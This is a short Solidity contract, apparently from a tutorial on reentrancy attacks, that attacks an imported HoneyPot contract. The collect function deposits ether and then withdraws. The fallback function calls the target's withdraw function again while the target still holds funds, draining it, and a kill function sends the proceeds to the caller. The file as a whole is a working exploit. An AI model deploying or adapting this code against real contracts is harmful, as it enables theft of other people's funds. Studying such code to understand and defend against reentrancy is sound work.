pragma solidity ^0.4.8;
/**
check this post https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4
 */

import "./HoneyPot.sol";
contract HoneyPotCollect {
  HoneyPot public honeypot;
  function HoneyPotCollect (address _honeypot) {
    honeypot = HoneyPot(_honeypot);
  }
  function kill () {
    suicide(msg.sender);
  }
  function collect() payable {
    honeypot.put.value(msg.value)();
    honeypot.get();
  }
  function () payable {
    if (honeypot.balance >= msg.value) {
      honeypot.get();
    }
  }
}